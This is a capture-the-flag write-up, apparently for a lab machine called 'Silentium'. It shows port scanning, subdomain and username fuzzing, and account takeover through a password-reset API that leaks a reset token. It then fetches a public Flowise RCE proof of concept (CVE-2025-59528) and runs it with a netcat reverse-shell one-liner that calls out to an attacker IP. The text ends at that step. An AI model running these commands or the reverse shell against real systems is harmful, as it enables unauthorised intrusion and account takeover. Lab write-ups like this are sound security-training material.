## Introduction

## Attack summary table

## Reconnainssance
### Port Scan

```bash
nmap 10.129.98.223 -n -Pn --min-rate 4000 -p- -oN scans/fast_scan

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
nmap 10.129.98.223 -n -Pn --min-rate 4000 -p 80 -sCV -oN scans/web_scv
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-14 10:47 CEST
Nmap scan report for 10.129.98.223
Host is up (0.072s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There is a redirection to `silentium.htb` so:
```bash
echo "10.129.98.223 silentium.htb" | tee -a >> /etc/hosts
```

```bash
whatweb http://silentium.htb
http://silentium.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.98.223], Script, Title[Silentium | Institutional Capital & Lending Solutions], nginx[1.24.0]
```

## Web Fuzzing

First of all i always use to fuzzing subdomains:
```bash
wfuzz -c -f sub-fighter -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://silentium.htb -H "Host: FUZZ.silentium.htb" --hc 403,404,301

Target: http://silentium.htb/
Total requests: 110000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                               
=====================================================================

000000060:   200        69 L     239 W      3142 Ch     "staging"  
```

```bash
echo "10.129.98.223 staging.silentium.htb" | tee -a >> /etc/hosts
```

This redirects us to a login panel, where now we cannot do anything, so tried to directory fuzzing and web site clone but the only i encountered was an `assets` folder with nothing interesting.

Last thing i tried to do is username enumeration in the login panel and found the user `ben`.

Previously captured the request with burpsuite and saw the data was send 
via POST in JSON format.

Burpsuite Request:
```bash
POST /api/v1/auth/login HTTP/1.1
Host: staging.silentium.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://staging.silentium.htb/signin
Content-Type: application/json
x-request-from: internal
Content-Length: 48
Origin: http://staging.silentium.htb
DNT: 1
Connection: keep-alive
Priority: u=0

{"email":"test@silentium.htb","password":"1234"}
```

And with ffuf and the correct flags, did username enumeration
```bash
ffuf -u http://staging.silentium.htb/api/v1/auth/login \
  -X POST \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"email":"FUZZ@silentium.htb","password":"1234"}' \
  -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt \
  -fr "User Not Found"
  

  ben                     [Status: 401, Size: 85, Words: 4, Lines: 1, Duration: 166ms]
```

## Token Interception and reset credentials
Tried also a dictionary attack but no result. And finally did clic on forgot password, it leads me to a form that i put the `ben@silentium.htb` user and intercepting with burpsuite i noticed that in te response was the temp token i need to reset a password. (i saw that in a reset password form )

Burpsuite request / Response
```bash
# SIMPLIFIED REQUEST
{"user":{"email":"ben@silentium.htb"}}

# SIMPLIFIED RESPONSE
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"zYs7QyNaG4t1qJH7PSSgAr0H5tHikPvaSPDkRqxtalpWERSS5hL9FV8YUwlZJkFq","tokenExpiry":"2026-09-14T10:33:21.810Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-09-14T10:18:21.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
```

With tis `tempToken` i was able to reset the password, and finally loged in Flowise website.

## Obtaining a shell
Looking for the version i saw the Flowise AI version is 3.0.5 and there is a POC to gain a shell in that version. (but first we have to create an API KEY via web control panel)

```bash
curl -sSLO 'https://raw.githubusercontent.com/corey-farley/CVE-2025-59528-Flowise-RCE/main/CVE-2025-59528.py'

chmod +x CVE-2025-59528.py

./CVE-2025-59528.py -t 'http://staging.silentium.htb' -k '1EY7p4NHCaxJFNWG92Dk4lZreuMW33ytASTX90SeQrM' -cmd 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.74 443 >/tmp/f'
```





